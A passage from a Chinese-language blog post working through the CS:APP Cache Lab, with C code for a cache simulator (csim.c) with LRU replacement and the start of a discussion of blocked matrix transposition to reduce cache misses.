class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">trans_func_t</span> func_list[MAX_TRANS_FUNCS];</span><br><span class="line"><span class="keyword">int</span> func_counter = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - Summarize the cache simulation statistics. Student cache simulators</span></span><br><span class="line"><span class="comment"> *                must call this function in order to be properly autograded. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits, <span class="keyword">int</span> misses, <span class="keyword">int</span> evictions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hits:%d misses:%d evictions:%d\n&quot;</span>, hits, misses, evictions);</span><br><span class="line">    FILE* output_fp = fopen(<span class="string">&quot;.csim_results&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    assert(output_fp);</span><br><span class="line">    <span class="built_in">fprintf</span>(output_fp, <span class="string">&quot;%d %d %d\n&quot;</span>, hits, misses, evictions);</span><br><span class="line">    fclose(output_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * initMatrix - Initialize the given matrix </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)&#123;</span><br><span class="line">            <span class="comment">// A[i][j] = i+j;  /* The matrix created this way is symmetric */</span></span><br><span class="line">            A[i][j]=rand();</span><br><span class="line">            B[j][i]=rand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">randMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)&#123;</span><br><span class="line">            <span class="comment">// A[i][j] = i+j;  /* The matrix created this way is symmetric */</span></span><br><span class="line">            A[i][j]=rand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * correctTrans - baseline transpose function used to evaluate correctness </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)&#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * registerTransFunction - Add the given trans function into your list</span></span><br><span class="line"><span class="comment"> *     of functions to be tested</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(<span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span>[N][M], <span class="keyword">int</span>[M][N]), </span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">char</span>* desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func_list[func_counter].func_ptr = trans;</span><br><span class="line">    func_list[func_counter].description = desc;</span><br><span class="line">    func_list[func_counter].correct = <span class="number">0</span>;</span><br><span class="line">    func_list[func_counter].num_hits = <span class="number">0</span>;</span><br><span class="line">    func_list[func_counter].num_misses = <span class="number">0</span>;</span><br><span class="line">    func_list[func_counter].num_evictions =<span class="number">0</span>;</span><br><span class="line">    func_counter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>csim.c实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define DEBUG_ON </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS_LENGTH 64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type: Memory address */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="keyword">mem_addr_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type: Cache line</span></span><br><span class="line"><span class="comment">   LRU is a counter used to implement LRU replacement policy  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> valid;</span><br><span class="line">    <span class="keyword">mem_addr_t</span> tag;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> lru;</span><br><span class="line">&#125; <span class="keyword">cache_line_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">cache_line_t</span>* <span class="keyword">cache_set_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">cache_set_t</span>* <span class="keyword">cache_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Globals set by command line args */</span></span><br><span class="line"><span class="keyword">int</span> verbosity = <span class="number">0</span>; <span class="comment">/* print trace if set */</span></span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0</span>; <span class="comment">/* set index bits */</span></span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>; <span class="comment">/* block offset bits */</span></span><br><span class="line"><span class="keyword">int</span> E = <span class="number">0</span>; <span class="comment">/* associativity */</span></span><br><span class="line"><span class="keyword">char</span>* trace_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Derived from command line args */</span></span><br><span class="line"><span class="keyword">int</span> S; <span class="comment">/* number of sets */</span></span><br><span class="line"><span class="keyword">int</span> B; <span class="comment">/* block size (bytes) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Counters used to record cache statistics */</span></span><br><span class="line"><span class="keyword">int</span> miss_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> hit_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> eviction_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> lru_counter = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The cache we are simulating */</span></span><br><span class="line"><span class="keyword">cache_t</span> cache;  </span><br><span class="line"><span class="keyword">mem_addr_t</span> set_index_mask;<span class="comment">//用于从内存地址得到缓存组的索引值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * initCache - Allocate memory, write 0&#x27;s for valid and tag and LRU</span></span><br><span class="line"><span class="comment"> * also computes the set_index_mask</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">truecache = (<span class="keyword">cache_t</span>) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">cache_set_t</span>) * S);</span><br><span class="line">true<span class="keyword">int</span> i;</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">truetruecache[i] = (<span class="keyword">cache_set_t</span>) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">cache_line_t</span>) * E);</span><br><span class="line">truetrue<span class="built_in">memset</span> (cache[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">cache_line_t</span>) * E);</span><br><span class="line">true&#125;</span><br><span class="line">trueset_index_mask = (<span class="keyword">mem_addr_t</span>) (<span class="built_in">pow</span>(<span class="number">2</span>, s) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * freeCache - free allocated memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span class="keyword">int</span> i;</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">truetrue<span class="built_in">free</span> (cache[i]);</span><br><span class="line">true&#125;</span><br><span class="line">true<span class="built_in">free</span> (cache);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * accessData - Access data at memory address addr.</span></span><br><span class="line"><span class="comment"> *   If it is already in cache, increase hit_count</span></span><br><span class="line"><span class="comment"> *   If it is not in cache, bring it in cache, increase miss count.</span></span><br><span class="line"><span class="comment"> *   Also increase eviction_count if a line is evicted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">accessData</span><span class="params">(<span class="keyword">mem_addr_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span class="keyword">mem_addr_t</span> set_index = (addr &gt;&gt; b) &amp; set_index_mask;</span><br><span class="line">true<span class="keyword">mem_addr_t</span> tag = addr &gt;&gt; (s+b);</span><br><span class="line">true<span class="keyword">cache_set_t</span> <span class="built_in">set</span> = cache[set_index];</span><br><span class="line">true<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> eviction_lru = ULLONG_MAX;</span><br><span class="line">true<span class="keyword">int</span> eviction_line = <span class="number">0</span>;</span><br><span class="line">true<span class="keyword">int</span> i;</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">truetrue<span class="keyword">if</span> (<span class="built_in">set</span>[i].valid == <span class="number">1</span> &amp;&amp; <span class="built_in">set</span>[i].tag == tag) &#123;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].lru = lru_counter++;</span><br><span class="line">truetruetruehit_count++;</span><br><span class="line">truetruetrue<span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">truetruetrue<span class="keyword">return</span>;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">truemiss_count++;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">truetrue<span class="keyword">if</span> (<span class="built_in">set</span>[i].valid == <span class="number">0</span>) &#123;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].valid = <span class="number">1</span>;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].tag = tag;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].lru = lru_counter++;</span><br><span class="line">truetruetrue<span class="keyword">return</span>;</span><br><span class="line">truetrue&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>[i].lru &lt; eviction_lru) &#123;</span><br><span class="line">truetruetrueeviction_lru = <span class="built_in">set</span>[i].lru;</span><br><span class="line">truetruetrueeviction_line = i;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">trueeviction_count++;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">true<span class="built_in">set</span>[eviction_line].valid = <span class="number">1</span>;</span><br><span class="line">true<span class="built_in">set</span>[eviction_line].tag = tag;</span><br><span class="line">true<span class="built_in">set</span>[eviction_line].lru = lru_counter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * replayTrace - replays the given trace file against the cache </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">char</span>* trace_fn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">mem_addr_t</span> addr=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">    FILE* trace_fp = fopen(trace_fn, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!trace_fp)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: %s\n&quot;</span>, trace_fn, strerror(errno));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( fgets(buf, <span class="number">1000</span>, trace_fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="number">1</span>]==<span class="string">&#x27;S&#x27;</span> || buf[<span class="number">1</span>]==<span class="string">&#x27;L&#x27;</span> || buf[<span class="number">1</span>]==<span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf+<span class="number">3</span>, <span class="string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">if</span>(verbosity)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c %llx,%u &quot;</span>, buf[<span class="number">1</span>], addr, len);</span><br><span class="line"></span><br><span class="line">            accessData(addr);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* If the instruction is R/W then access again */</span></span><br><span class="line">            <span class="keyword">if</span>(buf[<span class="number">1</span>]==<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">                accessData(addr);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (verbosity)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(trace_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * printUsage - Print usage info</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Options:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -h         Print this help message.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nExamples:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - Main routine </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( (c=getopt(argc,argv,<span class="string">&quot;s:E:b:t:vh&quot;</span>)) != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            trace_file = optarg;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            verbosity = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            printUsage(argv);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printUsage(argv);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make sure that all required command line args were specified */</span></span><br><span class="line">    <span class="keyword">if</span> (s == <span class="number">0</span> || E == <span class="number">0</span> || b == <span class="number">0</span> || trace_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        printUsage(argv);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute S, E and B from command line args */</span></span><br><span class="line">    S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">trueB = <span class="number">1</span> &lt;&lt; b;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Initialize cache */</span></span><br><span class="line">    initCache();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG_ON</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DEBUG: S:%u E:%u B:%u trace:%s\n&quot;</span>, S, E, B, trace_file);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DEBUG: set_index_mask: %llu\n&quot;</span>, set_index_mask);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">    replayTrace(trace_file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free allocated memory */</span></span><br><span class="line">    freeCache();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the hit and miss statistics for the autograder */</span></span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果与csim-ref一致：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529151718449.png" alt="image-20210529151718449"></p><h2 id="优化矩阵转置操作"><a href="#优化矩阵转置操作" class="headerlink" title="优化矩阵转置操作"></a>优化矩阵转置操作</h2><p>参考：<a href="https://zhuanlan.zhihu.com/p/33846811">《深入理解计算机系统》配套实验：Cache Lab</a></p><p>要求：</p><ol><li>一共只准使用不超过 12 个 int 类型局部变量</li><li>不能用递归</li><li>不准改变 A 数组的内容</li><li>不能定义新的数组也不能用 malloc 函数开辟空间。</li></ol><p>最终要使得 cache miss 的次数尽可能少。</p><p>思考：</p><p>最终在参考模拟器csim-ref模拟1KB 直接映射、块大小32Bytes的cache（参数s=5、E=1、b=5）上测试访存轨迹文件。</p><p>b = 5 代表一个块可以容纳 2^5 = 32个字节，即8个int类型数据。而<strong>因为数组在内存中是按行存储的，故选取块的时候也是按行。</strong>每个数组元素的set_index位在b个偏移位前，这意味着每8个连续的数组元素会映射到同一个set。</p><h2 id="32-x-32"><a href="#32-x-32" class="headerlink" title="32 x 32"></a>32 x 32</h2><p>在 32 x 32的矩阵中，一行有4 个 cache 行，所以 cache 一共可以存矩阵的 8 行。故使用分块技术，每次处理矩阵的一个8*8分块。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210606133458231.png" alt="image-20210606133458231"></p><p>但简单的分块还不足以达到要求。</p><p>过程中可以看生成的trace文件，用模拟器 